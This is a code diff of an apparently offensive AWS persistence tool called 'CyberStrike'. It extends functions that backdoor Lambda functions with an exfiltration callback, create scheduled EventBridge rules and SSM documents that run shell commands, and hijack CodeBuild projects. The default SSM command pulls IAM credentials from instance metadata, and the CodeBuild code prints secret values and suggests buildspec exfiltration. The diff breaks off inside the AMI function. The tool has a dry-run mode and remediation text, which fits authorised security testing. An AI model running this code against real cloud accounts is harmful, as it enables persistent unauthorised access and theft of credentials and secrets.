@@ -7,36 +7,88 @@ export async function lambdaBackdoor(args: string[], timeout: number): Promise<H
   const method = argVal(args, "--method") || "inject"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Lambda Backdoor Assessment\n"]
 
-  if (!funcName) return { output: "ERROR: --function-name required", findings: [] }
-  if (!callbackUrl) return { output: "ERROR: --callback-url required", findings: [] }
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const identity = tryJson(id.stdout) || {}
+  const callerArn = identity.Arn || ""
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const actions = method === "inject"
+    ? ["lambda:GetFunction", "lambda:UpdateFunctionCode", "lambda:UpdateFunctionConfiguration"]
+    : ["lambda:CreateFunction", "iam:PassRole"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+  const denied = actions.filter(a => !allowed.includes(a))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of actions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  if (denied.length > 0) {
+    output.push(`\n[-] Missing permissions: ${denied.join(", ")} — persistence vector BLOCKED`)
+    findings.push({ checkId: "AWS-PERSIST-LAMBDA-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: `Lambda ${method} backdoor blocked — missing ${denied.join(", ")}`, details: `Cannot perform lambda persistence via ${method}`, remediation: "N/A — insufficient permissions" })
+    return { output: output.join("\n"), findings }
+  }
+
+  output.push(`\n[+] All required permissions ALLOWED — vector VIABLE`)
+  output.push(`[*] CloudTrail events: UpdateFunctionCode20150331v2, UpdateFunctionConfiguration20150331v2`)
+  output.push(`[*] GuardDuty: Possible UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS`)
+
+  if (!funcName) {
+    const funcs = await aws(["lambda", "list-functions", "--query", "Functions[].[FunctionName,Runtime,Role,LastModified]"], profile, region, timeout)
+    const fl = tryJson(funcs.stdout) || []
+    output.push(`\n[+] Available Lambda functions: ${fl.length}`)
+    for (const f of fl.slice(0, 15)) {
+      const roleName = (f[2] || "").split("/").pop()
+      output.push(`  ${f[0]} (${f[1]}) — role: ${roleName} — ${f[3]}`)
+    }
+    output.push(`\n[*] Use --function-name <name> --callback-url <url> to target a function`)
+    findings.push({ checkId: "AWS-PERSIST-LAMBDA-002", provider: "aws", severity: "critical", status: "READY", resource: `lambda://${fl.length}-functions`, title: `Lambda code injection viable on ${fl.length} functions`, details: `Identity has UpdateFunctionCode — can inject code into any accessible Lambda`, remediation: "Restrict lambda:UpdateFunctionCode to CI/CD roles, enable code signing" })
+    return { output: output.join("\n"), findings }
+  }
+
+  if (!callbackUrl) return { output: output.join("\n") + "\n[*] Use --callback-url <url> for exfil endpoint", findings }
 
   if (method === "inject") {
     const r = await aws(["lambda", "get-function", "--function-name", funcName], profile, region, timeout)
-    if (r.exitCode !== 0) return { output: `[-] Function not found: ${r.stderr.trim()}`, findings: [] }
+    if (r.exitCode !== 0) return { output: `[-] Function not found: ${r.stderr.trim()}`, findings }
     const func = tryJson(r.stdout)
     const cfg = func?.Configuration || {}
-    return {
-      output: [
-        `[*] Function: ${funcName}`,
-        `[*] Runtime: ${cfg.Runtime}`,
-        `[*] Role: ${cfg.Role}`,
-        `[*] Handler: ${cfg.Handler}`,
-        `[*] Code size: ${cfg.CodeSize} bytes`,
-        `[+] Download code, inject callback to ${callbackUrl}, and update`,
-      ].join("\n"),
-      findings: [],
+    const roleArn = cfg.Role || ""
+    output.push(`\n[*] Target: ${funcName}`)
+    output.push(`  Runtime: ${cfg.Runtime}, Handler: ${cfg.Handler}, Code: ${cfg.CodeSize} bytes`)
+    output.push(`  Role: ${roleArn}`)
+
+    const roleName = roleArn.split("/").pop() || ""
+    if (roleName) {
+      const rolePolicies = await aws(["iam", "list-attached-role-policies", "--role-name", roleName, "--query", "AttachedPolicies[].PolicyName"], profile, region, timeout)
+      const policies = tryJson(rolePolicies.stdout) || []
+      output.push(`  Attached policies: ${policies.join(", ") || "none"}`)
+      const isHighPriv = policies.some((p: string) => /AdministratorAccess|PowerUserAccess|FullAccess/.test(p))
+      if (isHighPriv) output.push(`  [!!] HIGH-PRIV ROLE — code injection gives admin access`)
     }
+
+    if (cfg.VpcConfig?.SubnetIds?.length > 0) {
+      output.push(`  VPC: ${cfg.VpcConfig.VpcId} (${cfg.VpcConfig.SubnetIds.length} subnets) — lateral movement possible`)
+    }
+
+    output.push(`\n[+] Steps:`)
+    output.push(`  1. aws lambda get-function --function-name ${funcName} --query Code.Location | xargs curl -o code.zip`)
+    output.push(`  2. Inject callback to ${callbackUrl} in handler`)
+    output.push(`  3. aws lambda update-function-code --function-name ${funcName} --zip-file fileb://code.zip`)
+
+    findings.push({ checkId: "AWS-PERSIST-LAMBDA-003", provider: "aws", severity: "critical", status: "READY", resource: `lambda://${funcName}`, title: `Lambda backdoor ready: ${funcName}`, details: `Runtime: ${cfg.Runtime}, Role: ${roleName}, callback: ${callbackUrl}`, remediation: `Audit function code, enable code signing, restrict UpdateFunctionCode` })
+  } else {
+    output.push(`\n[*] Create mode — new function '${funcName}' with callback to ${callbackUrl}`)
+    output.push(`[+] aws lambda create-function --function-name ${funcName} --runtime python3.11 --handler index.handler --role <role-arn> --zip-file fileb://payload.zip`)
+
+    findings.push({ checkId: "AWS-PERSIST-LAMBDA-003", provider: "aws", severity: "critical", status: "PLANNED", resource: `lambda://${funcName}`, title: `Lambda creation backdoor planned: ${funcName}`, details: `New function with callback to ${callbackUrl}`, remediation: `Delete: aws lambda delete-function --function-name ${funcName}` })
   }
 
-  return {
-    output: [
-      `[*] Create mode — would create new function '${funcName}'`,
-      `[*] Callback: ${callbackUrl}`,
-      `[+] Use: aws lambda create-function --function-name ${funcName} --runtime python3.11 --handler index.handler --role <HIGH_PRIV_ROLE_ARN> --zip-file fileb://payload.zip`,
-    ].join("\n"),
-    findings: [],
-  }
+  return { output: output.join("\n"), findings }
 }
 
 export async function iamBackdoor(args: string[], timeout: number): Promise<HookResult> {
@@ -111,157 +163,156 @@ export async function eventbridgeBackdoor(args: string[], timeout: number): Prom
   const targetArn = argVal(args, "--target-arn")
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] EventBridge Backdoor\n"]
+  const execute = hasFlag(args, "--execute")
+  const output: string[] = ["[*] EventBridge Backdoor Assessment\n"]
   const findings: Finding[] = []
 
-  if (!targetArn) {
-    const rules = await aws(
-      ["events", "list-rules", "--query", "Rules[].[Name,State,ScheduleExpression,EventBusName]"],
-      profile,
-      region,
-      timeout,
-    )
-    if (rules.exitCode === 0) {
-      const rl = tryJson(rules.stdout) || []
-      output.push(`[+] Existing Rules: ${rl.length}`)
-      for (const r of rl) output.push(`    ${r[0]} — ${r[1]} — ${r[2] || "event-pattern"} (${r[3]})`)
-    }
-    output.push("\n[*] Use --target-arn (Lambda/SSM ARN) to create scheduled backdoor")
-    output.push("[*] Options: --schedule 'rate(1 hour)' or --schedule 'cron(0 12 * * ? *)'")
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+
+  const simActions = ["events:PutRule", "events:PutTargets", "events:DeleteRule", "events:RemoveTargets"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const simResults = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = simResults.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+
+  output.push(`[*] Pre-flight permissions:`)
+  for (const a of simActions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  const canCreate = allowed.includes("events:PutRule") && allowed.includes("events:PutTargets")
+  if (!canCreate) {
+    output.push(`\n[-] Cannot create rules/targets — EventBridge persistence BLOCKED`)
+    findings.push({ checkId: "AWS-PERSIST-EB-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "EventBridge backdoor blocked", details: `Missing: ${simActions.filter(a => !allowed.includes(a)).join(", ")}`, remediation: "N/A" })
     return { output: output.join("\n"), findings }
   }
 
-  const create = await aws(
-    [
-      "events",
-      "put-rule",
-      "--name",
-      ruleName,
-      "--schedule-expression",
-      schedule,
-      "--state",
-      "ENABLED",
-      "--description",
-      "CyberStrike persistence",
-      "--tags",
-      "Key=CreatedBy,Value=CyberStrike",
-    ],
-    profile,
-    region,
-    timeout,
-  )
+  output.push(`\n[+] EventBridge persistence VIABLE`)
+  output.push(`[*] CloudTrail: PutRule, PutTargets (events.amazonaws.com)`)
+  output.push(`[*] Detection: look for rules with unknown names or CyberStrike tags`)
+
+  const rules = await aws(["events", "list-rules", "--query", "Rules[].[Name,State,ScheduleExpression,EventBusName]"], profile, region, timeout)
+  const rl = rules.exitCode === 0 ? tryJson(rules.stdout) || [] : []
+  output.push(`\n[+] Existing Rules: ${rl.length}`)
+  for (const r of rl) {
+    output.push(`  ${r[0]} — ${r[1]} — ${r[2] || "event-pattern"} (${r[3]})`)
+    const targets = await aws(["events", "list-targets-by-rule", "--rule", r[0] as string, "--query", "Targets[].[Id,Arn]"], profile, region, timeout)
+    const tl = targets.exitCode === 0 ? tryJson(targets.stdout) || [] : []
+    for (const t of tl) output.push(`    → ${t[1]}`)
+  }
+
+  const lambdas = await aws(["lambda", "list-functions", "--query", "Functions[].[FunctionArn,FunctionName]"], profile, region, timeout)
+  const ll = lambdas.exitCode === 0 ? tryJson(lambdas.stdout) || [] : []
+  if (ll.length > 0) {
+    output.push(`\n[+] Available Lambda targets: ${ll.length}`)
+    for (const l of ll.slice(0, 5)) output.push(`  ${l[1]} — ${l[0]}`)
+  }
+
+  if (!targetArn) {
+    output.push(`\n[*] Use --target-arn <lambda-arn> --execute to create scheduled backdoor`)
+    output.push(`[*] Options: --schedule 'rate(1 hour)' | 'rate(5 minutes)' | 'cron(0 12 * * ? *)'`)
+    findings.push({ checkId: "AWS-PERSIST-EB-002", provider: "aws", severity: "high", status: "READY", resource: `events://viable`, title: `EventBridge scheduled persistence viable — ${ll.length} Lambda targets available`, details: `Can create scheduled rules triggering any Lambda/SSM target`, remediation: "Restrict events:PutRule, events:PutTargets via IAM policy" })
+    return { output: output.join("\n"), findings }
+  }
+
+  if (!execute) {
+    output.push(`\n[*] DRY RUN — would create rule "${ruleName}" → ${targetArn} on ${schedule}`)
+    output.push(`[*] Pass --execute to create`)
+    return { output: output.join("\n"), findings }
+  }
+
+  const create = await aws(["events", "put-rule", "--name", ruleName, "--schedule-expression", schedule, "--state", "ENABLED", "--description", "CyberStrike persistence", "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
   if (create.exitCode !== 0) {
     output.push(`[-] Rule creation failed: ${create.stderr.trim()}`)
     return { output: output.join("\n"), findings }
   }
 
-  output.push(`[+] Rule created: ${ruleName} (${schedule})`)
+  output.push(`\n[+] Rule created: ${ruleName} (${schedule})`)
 
-  const target = await aws(
-    ["events", "put-targets", "--rule", ruleName, "--targets", JSON.stringify([{ Id: "cs-target", Arn: targetArn }])],
-    profile,
-    region,
-    timeout,
-  )
+  const target = await aws(["events", "put-targets", "--rule", ruleName, "--targets", JSON.stringify([{ Id: "cs-target", Arn: targetArn }])], profile, region, timeout)
   if (target.exitCode === 0) output.push(`[+] Target set: ${targetArn}`)
   else output.push(`[-] Target set failed: ${target.stderr.trim()}`)
 
-  findings.push({
-    checkId: "AWS-PERSIST-002",
-    provider: "aws",
-    severity: "critical",
-    status: "CREATED",
-    resource: `events:${ruleName}`,
-    title: `EventBridge scheduled backdoor: ${ruleName}`,
-    details: `Rule triggers ${targetArn} on schedule: ${schedule}`,
-    remediation: "Delete rule: aws events delete-rule --name " + ruleName,
-  })
+  output.push(`\n[+] Cleanup: aws events remove-targets --rule ${ruleName} --ids cs-target && aws events delete-rule --name ${ruleName}`)
+
+  findings.push({ checkId: "AWS-PERSIST-EB-003", provider: "aws", severity: "critical", status: "CREATED", resource: `events:${ruleName}`, title: `EventBridge scheduled backdoor: ${ruleName}`, details: `Rule triggers ${targetArn} every ${schedule}`, remediation: `aws events remove-targets --rule ${ruleName} --ids cs-target && aws events delete-rule --name ${ruleName}` })
 
   return { output: output.join("\n"), findings }
 }
 
 export async function ssmDocumentBackdoor(args: string[], timeout: number): Promise<HookResult> {
   const docName = argVal(args, "--document-name") || `cs-doc-${Date.now().toString(36)}`
-  const command =
-    argVal(args, "--command") || "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  const command = argVal(args, "--command") || "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] SSM Document Backdoor\n"]
+  const execute = hasFlag(args, "--execute")
+  const output: string[] = ["[*] SSM Document Backdoor Assessment\n"]
   const findings: Finding[] = []
 
-  if (hasFlag(args, "--list")) {
-    const docs = await aws(
-      [
-        "ssm",
-        "list-documents",
-        "--document-filter-list",
-        "key=Owner,value=Self",
-        "--query",
-        "DocumentIdentifiers[].[Name,DocumentType,PlatformTypes]",
-      ],
-      profile,
-      region,
-      timeout,
-    )
-    if (docs.exitCode === 0) {
-      const dl = tryJson(docs.stdout) || []
-      output.push(`[+] Custom SSM Documents: ${dl.length}`)
-      for (const d of dl) output.push(`    ${d[0]} (${d[1]}) — ${(d[2] || []).join(",")}`)
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+
+  const simActions = ["ssm:CreateDocument", "ssm:SendCommand", "ssm:UpdateDocument", "ssm:DescribeInstanceInformation"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const simResults = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = simResults.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+
+  output.push(`[*] Pre-flight permissions:`)
+  for (const a of simActions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  const canCreate = allowed.includes("ssm:CreateDocument")
+  const canSend = allowed.includes("ssm:SendCommand")
+  if (!canCreate && !canSend) {
+    output.push(`\n[-] Cannot create documents or send commands — SSM persistence BLOCKED`)
+    findings.push({ checkId: "AWS-PERSIST-SSM-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "SSM document backdoor blocked", details: `Missing: ${simActions.filter(a => !allowed.includes(a)).join(", ")}`, remediation: "N/A" })
+    return { output: output.join("\n"), findings }
+  }
+
+  output.push(`\n[+] SSM persistence VIABLE — create: ${canCreate ? "YES" : "NO"}, send: ${canSend ? "YES" : "NO"}`)
+  output.push(`[*] CloudTrail: CreateDocument, SendCommand, StartSession`)
+  output.push(`[*] GuardDuty: N/A (SSM commands not directly monitored)`)
+
+  const instances = await aws(["ssm", "describe-instance-information", "--query", "InstanceInformationList[].[InstanceId,PingStatus,PlatformType,PlatformName,AgentVersion]"], profile, region, timeout)
+  const il = instances.exitCode === 0 ? tryJson(instances.stdout) || [] : []
+  output.push(`\n[+] SSM-managed instances: ${il.length}`)
+  const online = il.filter((i: unknown[]) => i[1] === "Online")
+  output.push(`[+] Online: ${online.length}`)
+  for (const i of online.slice(0, 15)) output.push(`  ${i[0]} — ${i[1]} — ${i[2]}/${i[3]} — agent ${i[4]}`)
+
+  const docs = await aws(["ssm", "list-documents", "--document-filter-list", "key=Owner,value=Self", "--query", "DocumentIdentifiers[].[Name,DocumentType,PlatformTypes]"], profile, region, timeout)
+  const dl = docs.exitCode === 0 ? tryJson(docs.stdout) || [] : []
+  output.push(`\n[+] Custom SSM Documents: ${dl.length}`)
+  for (const d of dl) output.push(`  ${d[0]} (${d[1]}) — ${(d[2] || []).join(",")}`)
+
+  if (canSend && online.length > 0) {
+    findings.push({ checkId: "AWS-PERSIST-SSM-002", provider: "aws", severity: "critical", status: "READY", resource: `ssm://${online.length}-instances`, title: `SSM command execution viable on ${online.length} instances`, details: `SendCommand allowed + ${online.length} online instances — arbitrary code execution`, remediation: "Restrict ssm:SendCommand to specific documents and instance tags" })
+  }
+
+  if (!execute) {
+    if (canCreate) output.push(`\n[*] Use --execute to create document "${docName}" with command: ${command}`)
+    if (canSend && online.length > 0) {
+      output.push(`[*] Quick exec (no document needed): aws ssm send-command --document-name AWS-RunShellScript --parameters commands='["${command}"]' --instance-ids ${(online[0] as string[])[0]}`)
     }
     return { output: output.join("\n"), findings }
   }
 
-  const content = JSON.stringify({
-    schemaVersion: "2.2",
-    description: "CyberStrike persistence document",
-    mainSteps: [
-      {
-        action: "aws:runShellScript",
-        name: "runCommand",
-        inputs: {
-          runCommand: [command],
-        },
-      },
-    ],
-  })
+  if (!canCreate) {
+    output.push(`\n[-] Cannot create document — use send-command with built-in AWS-RunShellScript instead`)
+    return { output: output.join("\n"), findings }
+  }
 
-  const create = await aws(
-    [
-      "ssm",
-      "create-document",
-      "--name",
-      docName,
-      "--document-type",
-      "Command",
-      "--content",
-      content,
-      "--document-format",
-      "JSON",
-      "--tags",
-      "Key=CreatedBy,Value=CyberStrike",
-    ],
-    profile,
-    region,
-    timeout,
-  )
+  const content = JSON.stringify({ schemaVersion: "2.2", description: "CyberStrike persistence document", mainSteps: [{ action: "aws:runShellScript", name: "runCommand", inputs: { runCommand: [command] } }] })
+  const create = await aws(["ssm", "create-document", "--name", docName, "--document-type", "Command", "--content", content, "--document-format", "JSON", "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
   if (create.exitCode !== 0) {
     output.push(`[-] Document creation failed: ${create.stderr.trim()}`)
     return { output: output.join("\n"), findings }
   }
 
-  output.push(`[+] Document created: ${docName}`)
-  output.push(`[*] Execute on target: aws ssm send-command --document-name ${docName} --instance-ids <ID>`)
+  output.push(`\n[+] Document created: ${docName}`)
+  output.push(`[*] Execute: aws ssm send-command --document-name ${docName} --instance-ids <ID>`)
+  output.push(`[*] Cleanup: aws ssm delete-document --name ${docName}`)
 
-  findings.push({
-    checkId: "AWS-PERSIST-003",
-    provider: "aws",
-    severity: "high",
-    status: "CREATED",
-    resource: `ssm:doc:${docName}`,
-    title: `SSM document backdoor: ${docName}`,
-    details: `Custom SSM document that executes: ${command}`,
-    remediation: "Delete document: aws ssm delete-document --name " + docName,
-  })
+  findings.push({ checkId: "AWS-PERSIST-SSM-003", provider: "aws", severity: "critical", status: "CREATED", resource: `ssm:doc:${docName}`, title: `SSM document backdoor: ${docName}`, details: `Custom document executes: ${command}. ${online.length} online instances available.`, remediation: `aws ssm delete-document --name ${docName}` })
 
   return { output: output.join("\n"), findings }
 }
@@ -272,64 +323,84 @@ export async function codebuildBackdoor(args: string[], timeout: number): Promis
   const roleArn = argVal(args, "--role-arn")
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] CodeBuild Backdoor\n"]
+  const output: string[] = ["[*] CodeBuild Backdoor Assessment\n"]
   const findings: Finding[] = []
 
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const identity = tryJson(id.stdout) || {}
+  const callerArn = identity.Arn || ""
+
+  const simActions = ["codebuild:CreateProject", "codebuild:StartBuild", "codebuild:UpdateProject", "iam:PassRole"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const simResults = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = simResults.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+
+  output.push(`[*] Pre-flight permissions:`)
+  for (const a of simActions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  const canCreate = allowed.includes("codebuild:CreateProject") && allowed.includes("iam:PassRole")
+  const canUpdate = allowed.includes("codebuild:UpdateProject")
+  if (!canCreate && !canUpdate) {
+    output.push(`\n[-] Cannot create or update CodeBuild projects — vector BLOCKED`)
+    findings.push({ checkId: "AWS-PERSIST-CB-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CodeBuild backdoor blocked — insufficient permissions", details: `Missing: ${simActions.filter(a => !allowed.includes(a)).join(", ")}`, remediation: "N/A" })
+    return { output: output.join("\n"), findings }
+  }
+
+  output.push(`\n[+] CodeBuild persistence ${canCreate ? "CREATE" : ""}${canCreate && canUpdate ? " + " : ""}${canUpdate ? "UPDATE" : ""} VIABLE`)
+  output.push(`[*] CloudTrail: CreateProject, StartBuild, UpdateProject`)
+  output.push(`[*] GuardDuty: N/A (CodeBuild not monitored by default)`)
+
   const projects = await aws(["codebuild", "list-projects", "--query", "projects"], profile, region, timeout)
-  if (projects.exitCode === 0) {
-    const pl = tryJson(projects.stdout) || []
-    output.push(`[+] Existing Projects: ${pl.length}`)
-    for (const p of pl) {
-      const desc = await aws(
-        ["codebuild", "batch-get-projects", "--names", p, "--query", "projects[0].[name,serviceRole,environment.type]"],
-        profile,
-        region,
-        timeout,
-      )
-      if (desc.exitCode === 0) {
-        const d = tryJson(desc.stdout)
-        output.push(`    ${d?.[0]} — role: ${(d?.[1] || "").split("/").pop()} — ${d?.[2]}`)
+  const pl = projects.exitCode === 0 ? tryJson(projects.stdout) || [] : []
+  output.push(`\n[+] Existing Projects: ${pl.length}`)
+
+  const hijackable: string[] = []
+  for (const p of pl.slice(0, 15)) {
+    const desc = await aws(["codebuild", "batch-get-projects", "--names", p, "--query", "projects[0]"], profile, region, timeout)
+    const d = tryJson(desc.stdout) || {}
+    const role = d.serviceRole || ""
+    const roleName = role.split("/").pop() || ""
+    const srcType = d.source?.type || "unknown"
+    const envType = d.environment?.type || "unknown"
+    const envVars = (d.environment?.environmentVariables || []) as Record<string, string>[]
+    const hasSecrets = envVars.some((v: Record<string, string>) => v.type === "SECRETS_MANAGER" || v.type === "PARAMETER_STORE")
+
+    output.push(`  ${p} — role: ${roleName}, src: ${srcType}, env: ${envType}${hasSecrets ? " [HAS SECRETS]" : ""}`)
+
+    if (canUpdate) {
+      hijackable.push(p)
+      const secretVars = envVars.filter((v: Record<string, string>) => v.type === "SECRETS_MANAGER" || v.type === "PARAMETER_STORE")
+      if (secretVars.length > 0) {
+        output.push(`    [!] Secrets: ${secretVars.map((v: Record<string, string>) => `${v.name}=${v.value}`).join(", ")}`)
+        findings.push({ checkId: "AWS-PERSIST-CB-002", provider: "aws", severity: "high", status: "FAIL", resource: `codebuild://${p}`, title: `CodeBuild ${p} exposes secrets — hijack target`, details: `${secretVars.length} secrets via env vars, role: ${roleName}`, remediation: "Restrict codebuild:UpdateProject, rotate exposed secrets" })
+      }
+
+      const attached = await aws(["iam", "list-attached-role-policies", "--role-name", roleName, "--query", "AttachedPolicies[].PolicyName"], profile, region, timeout)
+      const policies = tryJson(attached.stdout) || []
+      const isHighPriv = policies.some((pol: string) => /AdministratorAccess|PowerUserAccess|FullAccess/.test(pol))
+      if (isHighPriv) {
+        output.push(`    [!!] HIGH-PRIV ROLE: ${policies.join(", ")} — buildspec injection = admin`)
+        findings.push({ checkId: "AWS-PERSIST-CB-003", provider: "aws", severity: "critical", status: "FAIL", resource: `codebuild://${p}`, title: `CodeBuild ${p} has high-priv role — buildspec injection = admin`, details: `Role ${roleName} has ${policies.join(", ")}`, remediation: "Scope down CodeBuild service role to minimum required" })
       }
     }
   }
 
-  if (!roleArn) {
-    output.push("\n[*] Use --role-arn to create backdoor CodeBuild project")
-    output.push("[*] Use --callback-url for exfil endpoint")
-    return { output: output.join("\n"), findings }
+  if (hijackable.length > 0 && canUpdate) {
+    output.push(`\n[+] Hijackable projects (UpdateProject allowed): ${hijackable.length}`)
+    output.push(`[*] Attack: modify buildspec to exfil secrets/credentials on next build`)
+    output.push(`[*] Command: aws codebuild update-project --name <project> --source-version '' --source type=NO_SOURCE,buildspec='<malicious>'`)
   }
 
-  const buildspec = [
-    "version: 0.2",
-    "phases:",
-    "  build:",
-    "    commands:",
-    "      - aws sts get-caller-identity",
-    "      - env | sort",
-    callbackUrl ? `      - curl -s -d \"$(aws sts get-caller-identity)\" ${callbackUrl}` : "",
-  ]
-    .filter(Boolean)
-    .join("\n")
+  if (canCreate && roleArn) {
+    output.push(`\n[*] Would create CodeBuild project: ${projectName} with role ${roleArn}`)
+    output.push(`    aws codebuild create-project --name ${projectName} --service-role ${roleArn} --source type=NO_SOURCE,buildspec='version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws sts get-caller-identity\\n      - env | sort' --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0`)
+    output.push(`    aws codebuild start-build --project-name ${projectName}`)
 
-  output.push(`[*] Would create CodeBuild project: ${projectName}`)
-  output.push(`[*] Service role: ${roleArn}`)
-  output.push(`[*] Buildspec:\n${buildspec}`)
-  output.push(`\n[*] Create with:`)
-  output.push(
-    `    aws codebuild create-project --name ${projectName} --service-role ${roleArn} --source type=NO_SOURCE,buildspec="${buildspec}" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0`,
-  )
-  output.push(`    aws codebuild start-build --project-name ${projectName}`)
-
-  findings.push({
-    checkId: "AWS-PERSIST-004",
-    provider: "aws",
-    severity: "high",
-    status: "PLANNED",
-    resource: `codebuild:${projectName}`,
-    title: `CodeBuild backdoor planned: ${projectName}`,
-    details: `CodeBuild project with role ${roleArn} for persistent code execution`,
-    remediation: "Delete project and restrict codebuild:CreateProject + iam:PassRole",
-  })
+    findings.push({ checkId: "AWS-PERSIST-CB-004", provider: "aws", severity: "critical", status: "PLANNED", resource: `codebuild://${projectName}`, title: `CodeBuild backdoor planned: ${projectName}`, details: `New project with role ${roleArn}, persistent code execution`, remediation: `Delete: aws codebuild delete-project --name ${projectName}. Restrict codebuild:CreateProject + iam:PassRole` })
+  } else if (canCreate && !roleArn) {
+    output.push(`\n[*] Use --role-arn <arn> to create new backdoor project`)
+  }
 
   return { output: output.join("\n"), findings }
 }
@@ -338,82 +409,92 @@ export async function amiBackdoor(args: string[], timeout: number): Promise<Hook
   const instanceId = argVal(args, "--instance-id")
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] AMI Backdoor\n"]
+  const execute = hasFlag(args, "--execute")
+  const output: string[] = ["[*] AMI Backdoor Assessment\n"]
   const findings: Finding[] = []
 
-  if (!instanceId) {
-    const amis = await aws(
-      ["ec2", "describe-images", "--owners", "self", "--query", "Images[].[ImageId,Name,State,Public,CreationDate]"],
-      profile,
-      region,
-      timeout,
-    )
-    if (amis.exitCode === 0) {
-      const al = tryJson(amis.stdout) || []
-      output.push(`[+] Owned AMIs: ${al.length}`)
-      for (const a of al) output.push(`    ${a[0]} — ${a[1]} — ${a[2]}${a[3] ? " [PUBLIC]" : ""} — ${a[4]}`)
-    }
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
 
-    const instances = await aws(
-      [
-        "ec2",
-        "describe-instances",
-        "--query",
-        "Reservations[].Instances[].[InstanceId,InstanceType,State.Name]",
-        "--filters",
-        "Name=instance-state-name,Values=running",
-      ],
-      profile,
-      region,
-      timeout,
-    )
-    if (instances.exitCode === 0) {
-      const il = tryJson(instances.stdout) || []
-      output.push(`\n[+] Running Instances: ${il.length}`)
-      for (const i of il) output.push(`    ${i[0]} (${i[1]}) — ${i[2]}`)
+  const simActions = ["ec2:CreateImage", "ec2:ModifyImageAttribute", "ec2:DescribeImages", "ec2:DescribeInstances"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const simResults = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = simResults.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+
+  output.push(`[*] Pre-flight permissions:`)
+  for (const a of simActions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  const canCreate = allowed.includes("ec2:CreateImage")
+  const canShare = allowed.includes("ec2:ModifyImageAttribute")
+  if (!canCreate) {
+    output.push(`\n[-] ec2:CreateImage DENIED — AMI backdoor BLOCKED`)
+    findings.push({ checkId: "AWS-PERSIST-AMI-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "AMI backdoor blocked — cannot create images", details: "ec2:CreateImage denied", remediation: "N/A" })
+    return { output: output.join("\n"), findings }
+  }
+
+  output.push(`\n[+] AMI creation VIABLE${canShare ? " + cross-account sharing VIABLE" : ""}`)
